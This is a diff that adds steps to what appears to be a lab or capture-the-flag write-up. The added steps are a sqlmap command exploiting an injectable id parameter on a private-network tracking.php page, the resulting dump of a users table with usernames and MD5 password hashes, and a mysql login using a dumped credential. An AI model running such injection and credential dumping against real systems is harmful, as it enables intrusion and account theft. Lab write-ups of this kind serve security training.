@@ -219,3 +219,24 @@ MySQL [cmsbase]> select * from cmsbase.flag
 
 ```
 
+```text
+mysql --host=172.16.64.92 --user=fcadmin1 --password=c5d71f305bb017a66c5fa7fd66535b84 --port 63306 footracking
+```
+
+```text
+sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' -D footracking -T users --dump
+Database: footracking
+Table: users
+[4 entries]
++----+-----+----------------------------------+-----------+
+| id | adm | password                         | username  |
++----+-----+----------------------------------+-----------+
+| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84 | fcadmin1  |
+| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f | fcadmin2  |
+| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b | tracking1 |
+| 4  | no  | e10adc3949ba59abbe56e057f20f883e | tracking2 |
++----+-----+----------------------------------+-----------+    
+```
+
+![](../.gitbook/assets/image%20%287%29.png)
+
